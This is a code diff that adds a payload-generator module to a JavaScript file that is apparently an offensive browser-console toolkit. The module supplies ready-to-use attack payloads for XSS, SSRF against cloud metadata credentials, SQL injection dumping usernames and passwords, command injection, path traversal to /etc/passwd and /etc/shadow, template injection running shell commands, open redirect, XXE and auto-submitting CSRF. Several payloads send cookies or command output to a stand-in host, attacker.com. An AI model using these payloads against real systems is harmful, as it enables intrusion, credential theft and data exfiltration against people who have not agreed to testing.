@@ -5017,5 +5017,306 @@
   }
   window.generateExploitSuggestions = generateExploitSuggestions;
 
+  // ===========================================
+  // MISSING CAPABILITY: Automated Payload Generation
+  // ===========================================
+
+  // 1. XSS Payload Generator — context-aware payloads
+  window.generateXSSPayloads = function generateXSSPayloads(context) {
+    try {
+      var payloads = {
+        attribute: [
+          '" onfocus="alert(1)" autofocus="',
+          '" onmouseover="alert(1)"',
+          '"><img src=x onerror=alert(1)>',
+          '" onclick="alert(1)"',
+          '" oninput="alert(1)"',
+          '"><svg onload=alert(1)>'
+        ],
+        script: [
+          '"><script>alert(1)</script>',
+          '"><img src=x onerror="alert(1)">',
+          '"><svg/onload=alert(1)>',
+          '"><body onload=alert(1)>',
+          '"><iframe src="javascript:alert(1)">',
+          '"><details open ontoggle=alert(1)>'
+        ],
+        text: [
+          '<script>alert(1)</script>',
+          '<img src=x onerror=alert(1)>',
+          '<svg onload=alert(1)>',
+          '<body onload=alert(1)>',
+          '<iframe src="javascript:alert(1)">',
+          '<input onfocus=alert(1) autofocus>'
+        ],
+        url: [
+          'javascript:alert(1)',
+          'data:text/html,<script>alert(1)</script>',
+          'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
+        ],
+        dom: [
+          '"><img src=x onerror=alert(document.domain)>',
+          '"><script>fetch("https://attacker.com/?c="+document.cookie)</script>',
+          '"><img src=x onerror="fetch(\'https://attacker.com/\'+document.cookie)">',
+          '"><svg/onload="fetch(\'https://attacker.com/?\'+document.cookie)">'
+        ]
+      };
+      var ctx = context || "text";
+      var result = payloads[ctx] || payloads.text;
+      console.log("%c💉 XSS payloads (" + ctx + "): " + result.length + " generated", "color: #e74c3c; font-weight: bold");
+      result.forEach(function(p, i) { console.log("  " + (i + 1) + ". " + p); });
+      return result;
+    } catch(e) { console.warn("generateXSSPayloads error:", e); return []; }
+  };
+
+  // 2. SSRF Payload Generator — internal IP and metadata URLs
+  window.generateSSRFPayloads = function generateSSRFPayloads() {
+    try {
+      var payloads = [
+        "http://127.0.0.1/",
+        "http://localhost/",
+        "http://[::1]/",
+        "http://0x7f000001/",
+        "http://0177.0.0.1/",
+        "http://127.0.0.1.nip.io/",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://metadata.google.internal/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://100.100.100.200/latest/meta-data/",
+        "http://forkexecv.com/",
+        "http://127.0.0.1:8080/",
+        "http://127.0.0.1:22/",
+        "http://127.0.0.1:3306/",
+        "http://127.0.0.1:5432/",
+        "http://127.0.0.1:6379/",
+        "http://127.0.0.1:27017/",
+        "http://[0:0:0:0:0:ffff:169.254.169.254]/",
+        "http://0100.0x7f.0x0.0x1/",
+        "http://127.1/",
+        "http://127.0.1/",
+        "http://127.0.0.0/"
+      ];
+      console.log("%c🔗 SSRF payloads: " + payloads.length + " generated", "color: #e74c3c; font-weight: bold");
+      payloads.forEach(function(p, i) { console.log("  " + (i + 1) + ". " + p); });
+      return payloads;
+    } catch(e) { console.warn("generateSSRFPayloads error:", e); return []; }
+  };
+
+  // 3. SQLi Payload Generator — error-based, blind, union
+  window.generateSQLiPayloads = function generateSQLiPayloads(type) {
+    try {
+      var payloads = {
+        error: [
+          "' OR '1'='1",
+          "' OR '1'='1'--",
+          "' OR '1'='1'#",
+          "1' ORDER BY 100--",
+          "1' UNION SELECT NULL--",
+          "1' UNION SELECT NULL,NULL--",
+          "1' UNION SELECT NULL,NULL,NULL--",
+          "'; WAITFOR DELAY '0:0:5'--",
+          "'; SELECT SLEEP(5)--",
+          "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
+        ],
+        blind: [
+          "' AND 1=1--",
+          "' AND 1=2--",
+          "' AND SUBSTRING(version(),1,1)='5'--",
+          "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+          "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
+          "' AND IF(1=1,SLEEP(5),0)--",
+          "' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--"
+        ],
+        union: [
+          "' UNION SELECT 1,2,3--",
+          "' UNION SELECT 1,2,3,4--",
+          "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
+          "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--",
+          "' UNION SELECT NULL,username,password FROM users--",
+          "' UNION ALL SELECT NULL,concat(username,':',password),NULL FROM users--"
+        ],
+        time: [
+          "'; WAITFOR DELAY '0:0:5'--",
+          "' AND SLEEP(5)--",
+          "' AND IF(1=1,SLEEP(5),0)--",
+          "1; SELECT pg_sleep(5)--",
+          "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+        ]
+      };
+      var t = type || "error";
+      var result = payloads[t] || payloads.error;
+      console.log("%c💉 SQLi payloads (" + t + "): " + result.length + " generated", "color: #e74c3c; font-weight: bold");
+      result.forEach(function(p, i) { console.log("  " + (i + 1) + ". " + p); });
+      return result;
+    } catch(e) { console.warn("generateSQLiPayloads error:", e); return []; }
+  };
+
+  // 4. Command Injection Payloads
+  window.generateCMDiPayloads = function generateCMDiPayloads() {
+    try {
+      var payloads = [
+        "; ls",
+        "| ls",
+        "|| ls",
+        "`ls`",
+        "$(ls)",
+        "; cat /etc/passwd",
+        "| cat /etc/passwd",
+        "; id",
+        "| id",
+        "`id`",
+        "$(id)",
+        "; sleep 5",
+        "| sleep 5",
+        "; ping -c 3 attacker.com",
+        "| curl http://attacker.com/$(whoami)",
+        "; wget http://attacker.com/$(whoami)",
+        "`whoami`",
+        "$(whoami)",
+        "; cat /etc/hostname",
+        "| cat /proc/version"
+      ];
+      console.log("%c💉 CMDi payloads: " + payloads.length + " generated", "color: #e74c3c; font-weight: bold");
+      payloads.forEach(function(p, i) { console.log("  " + (i + 1) + ". " + p); });
+      return payloads;
+    } catch(e) { console.warn("generateCMDiPayloads error:", e); return []; }
+  };
+
+  // 5. Path Traversal Payloads
+  window.generatePathTraversalPayloads = function generatePathTraversalPayloads() {
+    try {
+      var payloads = [
+        "../../../etc/passwd",
+        "....//....//....//etc/passwd",
+        "..%2f..%2f..%2fetc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+        "..\\..\\..\\etc\\passwd",
+        "....\\\\....\\\\....\\\\etc\\\\passwd",
+        "/etc/passwd%00",
+        "....//....//....//etc/passwd%00",
+        "..%252f..%252f..%252fetc/passwd",
+        "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd",
+        "....//....//....//etc/shadow",
+        "....//....//....//proc/self/environ",
+        "....//....//....//proc/self/cmdline",
+        "....//....//....//var/log/apache2/access.log",
+        "....//....//....//windows/win.ini",
+        "....//....//....//winboot/system.ini"
+      ];
+      console.log("%c💉 Path traversal payloads: " + payloads.length + " generated", "color: #e74c3c; font-weight: bold");
+      payloads.forEach(function(p, i) { console.log("  " + (i + 1) + ". " + p); });
+      return payloads;
+    } catch(e) { console.warn("generatePathTraversalPayloads error:", e); return []; }
+  };
+
+  // 6. SSTI Payloads — Server-Side Template Injection
+  window.generateSSTIPayloads = function generateSSTIPayloads() {
+    try {
+      var payloads = [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "#{7*7}",
+        "{{config.items()}}",
+        "{{self.__class__.__mro__}}",
+        "{{''.__class__.__mro__[2].__subclasses__()}}",
+        "${7*7}",
+        "#{7*7}",
+        "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "${T(java.lang.Runtime).getRuntime().exec('id')}",
+        "<%= system('id') %>",
+        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
+      ];
+      console.log("%c💉 SSTI payloads: " + payloads.length + " generated", "color: #e74c3c; font-weight: bold");
+      payloads.forEach(function(p, i) { console.log("  " + (i + 1) + ". " + p); });
+      return payloads;
+    } catch(e) { console.warn("generateSSTIPayloads error:", e); return []; }
+  };
+
+  // 7. Open Redirect Payloads
+  window.generateOpenRedirectPayloads = function generateOpenRedirectPayloads() {
+    try {
+      var payloads = [
+        "https://attacker.com",
+        "//attacker.com",
+        "https://attacker.com%00.target.com",
+        "https://target.com.attacker.com",
+        "https://target.com@attacker.com",
+        "https://attacker.com#target.com",
+        "https://target.com\\.attacker.com",
+        "javascript:alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+        "//attacker.com/%2f..",
+        "https://attacker.com/\\",
+        "https://target.com%40attacker.com",
+        "https://attacker.com?next=target.com",
+        "/\\attacker.com",
+        "///attacker.com"
+      ];
+      console.log("%c💉 Open redirect payloads: " + payloads.length + " generated", "color: #e74c3c; font-weight: bold");
+      payloads.forEach(function(p, i) { console.log("  " + (i + 1) + ". " + p); });
+      return payloads;
+    } catch(e) { console.warn("generateOpenRedirectPayloads error:", e); return []; }
+  };
+
+  // 8. XXE Payloads
+  window.generateXXEPayloads = function generateXXEPayloads() {
+    try {
+      var payloads = [
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo>&send;</foo>'
+      ];
+      console.log("%c💉 XXE payloads: " + payloads.length + " generated", "color: #e74c3c; font-weight: bold");
+      payloads.forEach(function(p, i) { console.log("  " + (i + 1) + ". " + p.substring(0, 80) + "..."); });
+      return payloads;
+    } catch(e) { console.warn("generateXXEPayloads error:", e); return []; }
+  };
+
+  // 9. CSRF Payloads
+  window.generateCSRFPayloads = function generateCSRFPayloads(targetUrl, params) {
+    try {
+      var url = targetUrl || "https://target.com/action";
+      var p = params || { action: "delete", id: "1" };
+      var forms = [];
+      var paramStr = Object.keys(p).map(function(k) { return '<input type="hidden" name="' + k + '" value="' + p[k] + '">'; }).join("\n    ");
+      forms.push('<form method="POST" action="' + url + '">\n    ' + paramStr + '\n    <input type="submit" value="Submit">\n  </form>\n  <script>document.forms[0].submit();</script>');
+      forms.push('fetch("' + url + '", {method: "POST", credentials: "include", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: "' + Object.keys(p).map(function(k) { return k + "=" + p[k]; }).join("&") + '"});');
+      forms.push('var x = new XMLHttpRequest(); x.open("POST", "' + url + '"); x.withCredentials = true; x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); x.send("' + Object.keys(p).map(function(k) { return k + "=" + p[k]; }).join("&") + '");');
+      console.log("%c💉 CSRF payloads: " + forms.length + " generated", "color: #e74c3c; font-weight: bold");
+      forms.forEach(function(f, i) { console.log("  " + (i + 1) + ":\n" + f); });
+      return forms;
+    } catch(e) { console.warn("generateCSRFPayloads error:", e); return []; }
+  };
+
+  // 10. Full Payload Generator — runs all generators
+  window.generateAllPayloads = function generateAllPayloads() {
+    try {
+      console.log("%c💉 PAYLOAD GENERATOR — Running all generators...", "color: #e74c3c; font-weight: bold; font-size: 14px");
+      var results = {
+        xss: window.generateXSSPayloads("text"),
+        ssrf: window.generateSSRFPayloads(),
+        sqli: window.generateSQLiPayloads("error"),
+        sqliBlind: window.generateSQLiPayloads("blind"),
+        sqliUnion: window.generateSQLiPayloads("union"),
+        cmdi: window.generateCMDiPayloads(),
+        pathTraversal: window.generatePathTraversalPayloads(),
+        ssti: window.generateSSTIPayloads(),
+        openRedirect: window.generateOpenRedirectPayloads(),
+        xxe: window.generateXXEPayloads()
+      };
+      var total = Object.keys(results).reduce(function(s, k) { return s + results[k].length; }, 0);
+      console.log("%c💉 Total payloads generated: " + total, "color: #e74c3c; font-weight: bold");
+      window.PAYLOADS_JSON = results;
+      console.log("Access: window.PAYLOADS_JSON");
+      return results;
+    } catch(e) { console.warn("generateAllPayloads error:", e); return {}; }
+  };
+
   // ===== ENHANCEMENTS INJECTION END =====
 })();
